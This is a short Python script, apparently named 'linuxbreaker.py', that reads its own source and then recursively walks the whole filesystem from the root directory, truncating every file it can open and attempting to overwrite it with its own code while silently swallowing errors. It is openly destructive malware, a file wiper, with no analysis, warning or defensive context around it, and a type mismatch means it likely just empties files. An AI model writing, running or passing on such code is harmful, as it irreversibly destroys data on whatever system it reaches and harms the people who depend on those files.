#!/usr/bin/env python3
import getpass
import os


code_file = open("linuxbreaker.py","r")
code = code_file.read()
code_file.close()


def main(root):
	global items
	try:
		children = list(os.listdir(root))
	except:
		return
	for child in children:
		if root == "/":
			child = root + child
		else:
			child = root + "/" + child
		if os.path.isdir(child):
			main(child)
		else:
			try:
				f = open(child, "bw")
				f.truncate(0)
				f.write(code)
				f.close()
			except:
				pass


main("/")
